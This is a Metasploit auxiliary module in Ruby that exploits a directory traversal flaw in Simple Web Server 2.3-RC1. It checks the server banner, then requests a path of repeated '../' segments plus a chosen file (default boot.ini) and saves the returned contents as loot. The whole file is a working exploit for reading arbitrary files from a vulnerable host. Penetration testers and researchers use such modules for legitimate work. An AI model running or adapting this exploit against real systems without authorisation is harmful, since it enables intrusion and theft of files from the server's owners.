##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report
	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Simple Web Server 2.3-RC1 Directory Traversal',
			'Description'    => %q{
					This module exploits a directory traversal vulnerability found in
				Simple Web Server 2.3-RC1.
			},
			'References'     =>
				[
					[ 'OSVDB', '88877' ],
					[ 'EDB', '23886' ],
					[ 'URL', 'http://seclists.org/bugtraq/2013/Jan/12' ]
				],
			'Author'         =>
				[
					'CwG GeNiuS',
					'sinn3r'
				],
			'License'        => MSF_LICENSE,
			'DisclosureDate' => "Jan 03 2013"
		))

		register_options(
			[
				OptString.new('FILEPATH', [true, 'The name of the file to download', 'boot.ini']),
				OptInt.new('DEPTH',       [true, 'The max traversal depth', 8])
			], self.class)

		deregister_options('RHOST')
	end


	#
	# The web server will actually return two HTTP statuses: A 400 (Bad Request), and the actual
	# HTTP status -- the second one is what we want.  We cannot use the original update_cmd_parts()
	# in Response, because that will only grab the first HTTP status.
	#
	def parse_status_line(res)
		str = res.to_s

		status_line = str.scan(/HTTP\/(.+?)\s+(\d+)\s?(.+?)\r?\n?$/)

		if status_line.empty?
			print_error("Invalid response command string.")
			return
		elsif status_line.length == 1
			proto, code, message = status_line[0]
		else
			proto, code, message = status_line[1]
		end

		return message, code.to_i, proto
	end


	#
	# The MSF API cannot parse this weird response
	#
	def parse_body(res)
		str = res.to_s
		str.split(/\r\n\r\n/)[2] || ''
	end


	def is_sws?
		res = send_request_raw({'uri'=>'/'})
		if res and res.headers['Server'].to_s =~ /PMSoftware\-SWS/
			return true
		else
			return false
		end
	end


	def run_host(ip)
		if not is_sws?
			print_error("#{ip}:#{rport} - This isn't a Simple Web Server")
			return
		end

		uri = normalize_uri("../"*datastore['DEPTH'], datastore['FILEPATH'])
		res = send_request_raw({'uri'=>uri})

		if not res
			print_error("#{ip}:#{rport} - Request timed out.")
			return
		end

		# The weird HTTP response totally messes up Rex::Proto::Http::Response, HA!
		message, code, proto = parse_status_line(res)
		body                 = parse_body(res)

		if code == 200

			if body.empty?
				# HD's likes vprint_* in case it's hitting a large network
				vprint_status("#{ip}:#{rport} - File is empty.")
				return
			end

			vprint_line(body)
			fname = ::File.basename(datastore['FILEPATH'])
			p = store_loot('simplewebserver.file', 'application/octet-stream', ip, body, fname)
			print_good("#{ip}:#{rport} - #{fname} stored in: #{p}")
		else
			print_error("#{ip}:#{rport} - Unable to retrieve file: #{code.to_s} (#{message})")
		end
	end
end

